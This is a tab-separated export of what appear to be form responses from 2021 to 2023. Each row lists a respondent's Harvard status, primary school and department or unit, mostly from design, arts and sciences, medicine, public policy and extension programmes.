Timestamp	Your Harvard status/appointment	Your primary affiliated school at Harvard	Your Harvard Department/Unit/Center/Program
9/21/2021 20:46:57	Post doctoral research associate	Harvard Graduate School of Design (GSD)	Harvard GSD
9/22/2021 9:32:13	Other Affliate	Non-Harvard	Harvard Catholic Student Center
9/26/2021 12:46:45	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Harvard PhD Program in Health Policy
9/27/2021 8:56:27	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	History and East Asian Language
9/28/2021 18:31:54	Graduate student: Doctorate	FAS Social Science Division	Archaeology
9/29/2021 12:55:13	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Economics
9/29/2021 16:50:25	Post doctoral research associate	FAS Social Science Division	Harvard University
9/30/2021 12:24:57	Post doctoral research associate	Harvard School of Engineering and Applied Sciences (SEAS)	Bioengineering
10/4/2021 23:39:07	Non-Harvard	Non-Harvard	International Center for Tropical Research
10/5/2021 12:01:48	Staff	HUIT, Libraries, UPO, other Harvard centers or programs	Arnold Arboretum
10/6/2021 11:10:47	Non-Harvard	Non-Harvard	na
10/12/2021 16:48:12	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Institute for Quantitative Social Science / Government
10/12/2021 20:59:56	Graduate student: Masters	Harvard School of Public Health (HSPH)	MPH-quantitative methods
10/12/2021 22:07:39	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Landscape Architecture
10/13/2021 4:26:17	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Anthropology
10/14/2021 12:16:40	Staff	Harvard Graduate School of Design (GSD)	/
10/14/2021 18:46:36	Research fellow	Harvard Medical School (HMS)	Pediatric Surgery 
10/17/2021 22:49:18	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Master in Design Studies
10/19/2021 10:08:29	Faculty	Harvard Medical School (HMS)	Beth Israel Deaconess Medical Center, Boston, MA
10/19/2021 15:57:01	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MDes, Energy and Environment
10/20/2021 11:33:45	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Arch
10/21/2021 1:18:55	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MAUD
10/21/2021 10:04:39	Research fellow	Harvard Medical School (HMS)	Department of Surgery 
10/25/2021 8:50:49	Non-Harvard	Non-Harvard	The Hong Kong Polytechnic University, Research Assistant
10/25/2021 13:52:17	Faculty	Harvard Medical School (HMS)	Boston Children's Hospital, Harvard Medical School
10/25/2021 15:54:09	Research fellow	Harvard Kennedy School of Government (HKS)	Government Performance Lab at HKS
10/25/2021 22:09:57	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	English
10/27/2021 15:33:45	Graduate student: Masters	Harvard Graduate School of Design (GSD)	GRADUATE STUDENT
10/28/2021 17:01:31	Post doctoral research associate	Harvard Graduate School of Design (GSD)	The Office for Urbanization
10/29/2021 11:05:39	Staff	FAS other units	Research Computing
11/5/2021 13:54:12	Post doctoral research associate	FAS Social Science Division	Harvard University
11/8/2021 9:46:46	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning
11/9/2021 12:00:06	Research assistant	Harvard School of Public Health (HSPH)	NIEHS Center for Environmental Health
11/9/2021 19:55:24	Non-Harvard	Non-Harvard	University of Southern California
11/12/2021 21:38:43	Non-Harvard	Non-Harvard	Clark University, Worcester, Massachusetts
11/15/2021 16:07:59	Graduate student: Doctorate	Harvard Graduate School of Design (GSD)	Doctor of Design program
11/16/2021 14:49:44	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Extension School
11/17/2021 9:32:10	Research assistant	Harvard Medical School (HMS)	BCH, Research Assistant
11/17/2021 9:33:25	Research assistant	Harvard Medical School (HMS)	BCH, Research Assistant
11/18/2021 13:51:04	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MDes ULE
11/18/2021 14:42:37	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MLA
11/18/2021 16:05:29	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MDes critical conservation
11/18/2021 20:36:06	Graduate student: Doctorate	Harvard Kennedy School of Government (HKS)	PPOL
11/19/2021 11:24:08	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Sustainability graduate student
11/19/2021 16:44:25	Other Affliate	Harvard Graduate School of Design (GSD)	MDes ULE
11/20/2021 0:57:09	Undergraduate student	Harvard College	Undergraduate at Harvard College
11/22/2021 0:49:03	Undergraduate student	Harvard College	Harvard College Student
11/22/2021 13:50:24	Faculty	FAS Social Science Division	Government
11/23/2021 12:47:56	Research assistant	Harvard School of Public Health (HSPH)	NIEHS Center for Environmental Health
11/23/2021 13:43:48	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	History of Art and Architecture
11/23/2021 16:14:17	Graduate student: Masters	Graduate School of Arts and Sciences (GSAS)	REECA
11/29/2021 7:05:22	Non-degree student	Non-Harvard	PERSONAL
11/29/2021 12:29:57	Faculty	Harvard Medical School (HMS)	Surgery (Brigham and Women's, Center for Surgery and Public Health)
11/29/2021 15:04:39	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Anthropology and Middle East Studies 
11/30/2021 15:23:26	Undergraduate student	Harvard College	Economics
12/1/2021 9:17:47	Graduate student: Doctorate	Harvard Graduate School of Design (GSD)	Harvard GSD
12/2/2021 16:16:19	Staff	Harvard School of Public Health (HSPH)	IT
12/6/2021 12:35:32	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	History, graduate student, 2nd year
12/7/2021 15:03:24	Research assistant	Harvard Medical School (HMS)	PEHSU
12/8/2021 12:12:47	Faculty	Harvard Medical School (HMS)	Pediatrics
12/9/2021 18:21:14	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Mdes Ecologies
12/9/2021 22:05:10	Faculty	FAS Social Science Division	Government
12/10/2021 15:46:03	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	Harvard Kennedy School
12/12/2021 10:33:34	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MDes Ecologies
12/13/2021 10:43:31	Undergraduate student	FAS Science Division	Statistics - Senior writing a thesis
12/13/2021 12:51:37	Non-Harvard	Non-Harvard	-
12/16/2021 11:35:34	Graduate student: Masters	Harvard School of Public Health (HSPH)	Harvard School of Public Health
1/3/2022 15:36:23	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	HKS Masters in Public Policy
1/7/2022 18:42:26	Non-Harvard	Non-Harvard	University of California, Irvine, doctoral candidate
1/10/2022 11:52:49	Undergraduate student	FAS Science Division	Statistics, undergrad
1/11/2022 13:34:08	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Extension School/Sustainability
1/18/2022 18:00:03	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Global Health 
1/20/2022 9:13:47	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	HEB
1/20/2022 14:44:52	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Landscape Architecture
1/21/2022 12:38:34	Staff	FAS other units	DSS at IQSS
1/23/2022 22:37:59	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	HKS Master of Public Policy
1/24/2022 10:46:39	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Harvard University
1/24/2022 19:30:19	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Public Policy
2/1/2022 10:36:46	Graduate student: Doctorate	FAS Social Science Division	Government
2/1/2022 13:58:23	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Harvard University
2/2/2022 12:54:56	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	MPAID
2/4/2022 14:51:45	Other Affliate	FAS Social Science Division	Universidade Federal Fluminense, Professor
2/4/2022 20:31:07	Post doctoral research associate	FAS Arts and Humanities Division	Weatherhead Center
2/8/2022 9:21:34	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
2/8/2022 12:07:21	Graduate student: Masters	Harvard Graduate School of Design (GSD)	N/A
2/8/2022 12:31:07	Staff	FAS Division of Continuing Education (DCE)	Online Teaching and Learning
2/8/2022 22:32:26	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Extension School Sustainability Studies
2/9/2022 10:09:43	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning
2/11/2022 15:23:58	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Data Science
2/13/2022 21:03:02	Undergraduate student	Harvard College	Applied Math
2/14/2022 10:57:15	Faculty	Harvard Graduate School of Design (GSD)	Landscape Architecture
2/14/2022 11:02:08	Faculty	Harvard School of Public Health (HSPH)	Harvard School of Public Health
2/15/2022 13:07:24	Research fellow	Harvard Medical School (HMS)	Department of Global Health and Social Medicine
2/16/2022 9:10:03	Non-Harvard	Non-Harvard	Marquette University, Faculty
2/16/2022 23:36:03	Graduate student: Masters	Harvard Graduate School of Education (GSE)	Council for Student Sustainability Leaders
2/17/2022 10:49:38	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Masters of Landscape Architecture I 
2/17/2022 11:12:36	Visitor	Graduate School of Arts and Sciences (GSAS)	Government Department
2/17/2022 14:15:05	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MLA
2/17/2022 23:19:03	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
2/20/2022 15:00:22	Non-Harvard	Non-Harvard	DILLA UNIVERSITY
2/20/2022 19:55:00	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Sustainability ALM
2/23/2022 13:06:02	Undergraduate student	Harvard College	Statistics
2/24/2022 12:33:33	Staff	Harvard Graduate School of Design (GSD)	Harvard University
2/24/2022 15:53:15	Research fellow	Harvard Medical School (HMS)	Rheumatology Division, Brigham and Women's Hospital, Harvard Medical School
2/28/2022 9:55:03	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Sustainability
3/2/2022 14:05:33	Undergraduate student	Harvard College	Statistics
3/4/2022 16:59:45	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Harvard Graduate School of Design
3/5/2022 15:59:18	Non-Harvard	Non-Harvard	MIT, Undergraduate Student
3/7/2022 9:59:06	Graduate student: Masters	FAS Division of Continuing Education (DCE)	ALM Capstone - Sustainability
3/9/2022 8:25:43	Faculty	FAS Social Science Division	Government
3/21/2022 11:52:59	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Masters in Urban Planning
3/22/2022 16:53:53	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	OEB
3/25/2022 0:01:23	Graduate student: Masters	Graduate School of Arts and Sciences (GSAS)	Regional Studies East Asia
3/25/2022 17:51:54	Undergraduate student	Harvard College	Statistics
3/28/2022 10:18:16	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Global Development Practice
3/28/2022 14:19:14	Research fellow	Harvard Medical School (HMS)	Department of Surgery 
3/28/2022 15:22:54	Post doctoral research associate	FAS other units	Medical School Global Health and Social Medicine
3/28/2022 15:53:31	Research fellow	Harvard Medical School (HMS)	Surgery 
3/31/2022 12:06:29	Research fellow	Harvard Medical School (HMS)	Surgery
3/31/2022 13:38:26	Research fellow	Harvard Medical School (HMS)	Surgery
4/1/2022 11:19:24	Graduate student: Doctorate	Harvard Medical School (HMS)	Brigham and Women's Hospital -- OrACORe Lab
4/2/2022 17:28:14	Undergraduate student	Harvard College	Government
4/5/2022 10:37:38	Research assistant	Harvard School of Public Health (HSPH)	Geographic & Contextual Measures Core
4/5/2022 11:13:23	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Harvard Graduate School of Design - Master in Design Studies
4/5/2022 20:42:42	Post doctoral research associate	Harvard Medical School (HMS)	Health Care Policy
4/6/2022 17:25:04	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	HKS
4/11/2022 13:26:23	Graduate student: Doctorate	FAS Social Science Division	Government
4/12/2022 12:58:07	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
4/14/2022 14:50:58	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Harvard University
4/14/2022 22:08:53	Faculty	FAS Arts and Humanities Division	Fairbank Center for Chinese Studies
4/15/2022 0:52:23	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MAUD
4/15/2022 0:57:47	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning and Design
4/15/2022 10:12:25	Non-degree student	Graduate School of Arts and Sciences (GSAS)	East Asian Language and Civilizations
4/15/2022 12:42:29	Research fellow	Harvard Medical School (HMS)	Department of Medicine, Massachusetts General Hospital
4/18/2022 14:17:32	Faculty	Harvard Business School (HBS)	Accounting and Management
4/18/2022 14:34:37	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	MCMPA
4/19/2022 10:29:13	Staff	FAS other units	Harvard Library, Maps Collection
4/19/2022 23:19:12	Non-Harvard	Non-Harvard	Brawijaya University, Undergraduate student
4/27/2022 9:35:14	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Harvard University
5/6/2022 4:34:52	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MLA II
5/6/2022 17:01:09	Graduate student: Doctorate	FAS Social Science Division	Economics
5/7/2022 18:06:24	Non-Harvard	Non-Harvard	Middle School Student
5/8/2022 20:45:34	Graduate student: Masters	FAS Division of Continuing Education (DCE)	n/a
5/13/2022 14:54:09	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
5/16/2022 16:51:28	Staff	FAS Science Division	Harvard University Center for the Environment
5/17/2022 9:32:03	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Sustainability
5/18/2022 16:11:39	Staff	HUIT, Libraries, UPO, other Harvard centers or programs	PIRC
5/19/2022 16:06:07	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	OEB
5/19/2022 16:16:05	Non-Harvard	Non-Harvard	University of Pennsylvania, master graduate
5/20/2022 12:23:29	Non-Harvard	Non-Harvard	University of Southern Maine, Director of USM GIS
5/20/2022 12:26:02	Non-Harvard	Non-Harvard	Harvard College alum
5/20/2022 13:03:59	Staff	FAS Arts and Humanities Division	University Development Office - Donor Relations
5/20/2022 14:40:54	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	University of Kentucky
5/20/2022 16:27:57	Non-Harvard	Non-Harvard	Splunk
5/20/2022 16:40:51	Research fellow	Harvard Medical School (HMS)	Surgery
5/20/2022 18:53:56	Non-Harvard	HUIT, Libraries, UPO, other Harvard centers or programs	Center for Geographic Analysis
5/20/2022 20:44:47	Non-Harvard	Non-Harvard	USGS Research Geographer
5/22/2022 11:57:05	Non-Harvard	Non-Harvard	OSGeo US
5/23/2022 12:00:45	Non-Harvard	Non-Harvard	N/A
5/23/2022 16:22:54	Faculty	Harvard Medical School (HMS)	Center for Data Sciences (BWH DOM) 
5/26/2022 17:47:24	Graduate student: Doctorate	FAS Social Science Division	Economics
5/30/2022 6:52:43	Non-Harvard	Non-Harvard	Khulna University 
5/30/2022 8:14:55	Visitor	Harvard School of Engineering and Applied Sciences (SEAS)	Sidus Space Inc. (CubeSats) Cape Canaveral
6/1/2022 15:17:55	Other Affliate	Harvard Business School (HBS)	Harvard Advanced Leadership Initiative
6/4/2022 3:03:29	Research fellow	Harvard Medical School (HMS)	Massachusetts General Hospital
6/5/2022 22:16:15	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MAUD
6/6/2022 19:01:38	Alum or Emeritus	Graduate School of Arts and Sciences (GSAS)	Study of Religion
6/9/2022 8:31:41	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Department of Urban Planning and Design
6/9/2022 14:33:19	Research fellow	Harvard Medical School (HMS)	Surgery
6/9/2022 18:24:09	Faculty	Harvard School of Public Health (HSPH)	Health Policy and Management
6/10/2022 8:37:30	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning and Design
6/13/2022 9:04:38	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Sustainability ALM
6/14/2022 18:06:36	Research fellow	Harvard Medical School (HMS)	Division of Disaster Medicine (BIDMC)
6/24/2022 12:14:13	Faculty	FAS Social Science Division	Economics
6/27/2022 11:11:49	Graduate student: Doctorate	FAS Science Division	OEB
6/28/2022 3:00:56	Faculty	Harvard Medical School (HMS)	Boston Children's Hospital, Harvard Medical School
7/1/2022 12:25:32	Non-Harvard	Non-Harvard	Texas A&M University, Faculty
7/5/2022 15:27:34	Graduate student: Doctorate	Harvard Kennedy School of Government (HKS)	Harvard University
7/6/2022 13:18:38	Faculty	FAS Science Division	Organismic and Evolutionary Biology
7/11/2022 20:33:24	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MUP, Harvard GSD
7/12/2022 21:03:56	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Sociology
7/13/2022 4:00:22	Other Affliate	FAS other units	Peabody Museum Associate
7/14/2022 13:00:52	Research assistant	Harvard School of Public Health (HSPH)	Department of Environmental Health
7/14/2022 13:06:37	Staff	Harvard College	Mindich Program in Engaged Scholarship
7/15/2022 11:19:05	Faculty	FAS other units	MEMCARE Superfund Research Center
7/19/2022 12:34:24	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	HSPH
7/20/2022 11:37:49	Staff	Harvard School of Public Health (HSPH)	MEMCARE Superfund Research Center
7/23/2022 15:42:39	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	English Department / Summer Pre-College Program
7/23/2022 22:53:11	Non-Harvard	Non-Harvard	Yale University, graduate student
7/26/2022 14:47:05	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Master of Landscape Architecture
7/27/2022 14:36:55	Post doctoral research associate	Harvard Medical School (HMS)	Department of Psychiatry
7/28/2022 9:27:46	Non-Harvard	Non-Harvard	The Media Line, Journalist 
8/1/2022 14:14:16	Faculty	FAS Social Science Division	Psychology
8/3/2022 9:28:33	Graduate student: Masters	Harvard Graduate School of Design (GSD)	NA
8/4/2022 8:57:11	Graduate student: Doctorate	Harvard School of Public Health (HSPH)	Environmental Health / Population Health Sciences / Environmental Epidemiology
8/6/2022 15:34:55	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Landscape Architecture
8/8/2022 15:33:10	Staff	FAS Arts and Humanities Division	Ukrainian Research Institute
8/9/2022 17:06:49	Staff	Harvard Business School (HBS)	Baker Library
8/11/2022 11:18:21	Faculty	Harvard School of Public Health (HSPH)	Environmental Health
8/11/2022 13:22:21	Staff	Harvard School of Public Health (HSPH)	Nutrition
8/14/2022 20:03:50	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MAUD
8/16/2022 21:00:14	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Master in Urban Planning
8/18/2022 9:52:22	Graduate student: Masters	FAS Division of Continuing Education (DCE)	HES
8/18/2022 16:32:24	Non-Harvard	Non-Harvard	Google, Engineer
8/23/2022 10:28:07	Staff	Harvard Graduate School of Design (GSD)	Joint Center for Housing Studies
8/29/2022 11:13:20	Research assistant	Harvard School of Public Health (HSPH)	NIEHS Center for Environmental Health
8/29/2022 12:03:28	Faculty	FAS Arts and Humanities Division	East Asian Languages and Civilizations
8/29/2022 16:34:29	Non-Harvard	Non-Harvard	Microsoft Security Software Engineer
9/1/2022 8:19:29	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	HKS/Economics
9/1/2022 15:58:06	Undergraduate student	Harvard College	GOV1008 - Intro to GIS
9/1/2022 21:32:42	Undergraduate student	Harvard College	GOV 1008
9/1/2022 23:43:52	Undergraduate student	Harvard College	Harvard College Study Abroad Program
9/2/2022 23:44:24	Non-Harvard	Non-Harvard	USDOT Volpe Center
9/5/2022 13:34:59	Undergraduate student	Harvard College	GOV 1008
9/7/2022 23:04:54	Non-degree student	FAS Division of Continuing Education (DCE)	Department of Continuing Education Masters Certificate Program
9/8/2022 4:13:08	Undergraduate student	FAS other units	Kalleman Ramos, student student, Federal University of Mato Grosso, Brazil.
9/9/2022 16:21:20	Non-Harvard	Non-Harvard	Clark University, Associate Professor
9/10/2022 10:36:32	Graduate student: Masters	Harvard Graduate School of Design (GSD)	GSD/MUP/VIS 2128 Spatial Analysis
9/18/2022 7:14:01	Graduate student: Masters	Harvard School of Engineering and Applied Sciences (SEAS)	Master in Design Engineering
9/21/2022 20:52:30	Non-Harvard	Non-Harvard	UC Berkeley, Graduate student
9/24/2022 15:51:35	Faculty	FAS other units	Hutchins Center for African American Studies
9/26/2022 14:49:59	Undergraduate student	Harvard College	Harvard College Applied Math
9/27/2022 5:38:05	Other Affliate	Harvard School of Public Health (HSPH)	Department of Environmental Health
9/27/2022 6:44:49	Non-Harvard	Non-Harvard	Gessal SA
9/30/2022 16:23:36	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	NELC
10/4/2022 12:33:28	Undergraduate student	Harvard College	Gov 1008
10/5/2022 12:20:47	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Sustainability
10/5/2022 14:37:22	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Visiting Fellow, Business Administration
10/6/2022 10:54:43	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Harvard University Graduate School of Design
10/7/2022 11:30:30	Graduate student: Doctorate	Harvard Graduate School of Design (GSD)	GSD/ DDes program
10/10/2022 13:57:55	Graduate student: Masters	HUIT, Libraries, UPO, other Harvard centers or programs	Harvard Extension School-Sustainability degree candidate, ALM
10/10/2022 20:17:45	Faculty	Harvard Graduate School of Education (GSE)	Stats
10/12/2022 17:56:14	Undergraduate student	Harvard College	Government
10/12/2022 19:41:07	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MUP
10/13/2022 9:45:03	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Department of Government
10/13/2022 12:12:10	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	N/A
10/13/2022 16:43:35	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MLA 1/MUP
10/16/2022 13:54:26	Graduate student: Doctorate	Harvard Business School (HBS)	Strategy
10/17/2022 14:12:49	Undergraduate student	Harvard College	Harvard Government Department
10/20/2022 13:58:13	Graduate student: Doctorate	Harvard Graduate School of Design (GSD)	Doctor of Design
10/20/2022 15:12:41	Post doctoral research associate	FAS Social Science Division	Center of Geographic Analysis
10/21/2022 13:15:21	Faculty	Harvard College	Harvard College Writing Program 
10/24/2022 10:25:35	Visitor	Non-Harvard	Southwestern College
10/26/2022 1:23:04	Undergraduate student	Harvard College	Economics
10/28/2022 12:22:38	Post doctoral research associate	FAS Social Science Division	Harvard Academy at the Weatherhead Center
10/31/2022 8:25:34	Non-Harvard	Non-Harvard	Technical university of Crete, Engineer 
10/31/2022 11:08:30	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Harvard University
11/3/2022 10:29:47	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Harvard GSD
11/4/2022 12:30:48	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Economics
11/4/2022 15:06:10	Non-Harvard	Non-Harvard	Rockland County NY
11/6/2022 13:22:09	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
11/7/2022 9:54:54	Faculty	Harvard Divinity School (HDS)	Women's Studies in Religion Program
11/7/2022 11:25:27	Staff	Harvard School of Public Health (HSPH)	Epidemiology
11/7/2022 16:09:47	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Landscape Architecture
11/9/2022 15:49:53	Research fellow	Radcliffe Institute for Advanced Study	Radcliffe Fellowship Program
11/14/2022 0:29:06	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning
11/15/2022 16:14:20	Undergraduate student	Harvard College	Harvard College ESE
11/16/2022 2:03:02	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Urban Planning and Design / Master of Urban Planning
11/17/2022 8:01:45	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MUP
11/17/2022 10:00:22	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	HKS Master in Public Policy candidate. Also affiliated w/ the Joint Center for Housing Studies 
11/17/2022 22:44:03	Faculty	Harvard Medical School (HMS)	Boston Children’s Hospital
11/18/2022 17:02:04	Non-Harvard	Non-Harvard	Televisa Univision Researcher
11/21/2022 11:27:33	Faculty	FAS Social Science Division	Center for European Studies
11/23/2022 22:02:20	Non-Harvard	Non-Harvard	CALIFORNIA STATE UNIVERSITY, San Bernardino; Faculty
11/25/2022 20:51:23	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	NELC Egyptology
11/28/2022 12:39:48	Visitor	Non-Harvard	Carleton College, faculty
11/28/2022 22:23:55	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Ethnomusicology degree candidate
11/29/2022 12:02:26	Research assistant	Harvard Medical School (HMS)	Boston Children's Hospital
11/29/2022 15:04:54	Undergraduate student	Harvard College	Government Department
11/29/2022 22:49:20	Graduate student: Masters	Harvard Graduate School of Design (GSD)	n/a
11/30/2022 10:28:43	Non-Harvard	Non-Harvard	Michigan State University, undergraduate student
11/30/2022 10:38:40	Non-Harvard	Non-Harvard	MIchigan State University, Undergraduate Student
11/30/2022 16:25:12	Staff	FAS Arts and Humanities Division	Archives Dept. at the Peabody Museum of Archaeology and Ethnology
11/30/2022 16:47:15	Staff	FAS other units	Peabody Museum / Archives
12/2/2022 11:03:56	Non-Harvard	Non-Harvard	VA Boston
12/6/2022 14:39:54	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	PhD Organismic and Evolutionary Biology
12/6/2022 18:11:53	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	MPA/ID
12/7/2022 19:16:58	Graduate student: Masters	Harvard Kennedy School of Government (HKS)	Master of Public Policy
12/8/2022 16:00:31	Undergraduate student	Harvard College	Harvard College, undergraduate student
12/15/2022 13:46:40	Staff	Harvard Medical School (HMS)	Countway Library; Publishing & Data Services
12/15/2022 17:30:27	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
12/21/2022 11:45:35	Research fellow	Harvard Medical School (HMS)	Boston Children's Hospital - Fellow
1/3/2023 14:37:53	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Department of Urban Planning and Design
1/4/2023 1:05:12	Research assistant	Harvard Business School (HBS)	D-Cubed
1/5/2023 12:22:18	Staff	HUIT, Libraries, UPO, other Harvard centers or programs	HUPAD
1/12/2023 11:38:59	Non-Harvard	Non-Harvard	NYC Landmarks Preservation Commission, Department of Archaeology
1/12/2023 14:21:03	Staff	FAS Division of Continuing Education (DCE)	Computer Lab
1/13/2023 10:40:13	Staff	Harvard Graduate School of Design (GSD)	GSD Library
1/15/2023 3:06:35	Graduate student: Masters	Harvard Graduate School of Education (GSE)	SSP
1/16/2023 21:02:36	Undergraduate student	Harvard College	Radcliffe Research Program Partner 
1/18/2023 11:24:01	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government Department
1/20/2023 15:05:31	Research fellow	Harvard Medical School (HMS)	Brigham and Women's Hospital
1/23/2023 6:35:26	Non-Harvard	Non-Harvard	Technical University of Munich Postgraduate Student
1/27/2023 16:29:54	Staff	Harvard Graduate School of Design (GSD)	Library
1/31/2023 22:56:35	Undergraduate student	Harvard College	Economics
2/2/2023 15:44:46	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Health Policy PhD Program 
2/3/2023 12:24:28	Post doctoral research associate	FAS Science Division	Harvard University Center for the Environment 
2/3/2023 15:28:16	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Organismic and Evolutionary Biology
2/5/2023 17:33:42	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Architecture
2/5/2023 19:09:12	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MDes
2/6/2023 14:58:38	Alum or Emeritus	Harvard College	Computer Science, now an Eliot House tutor
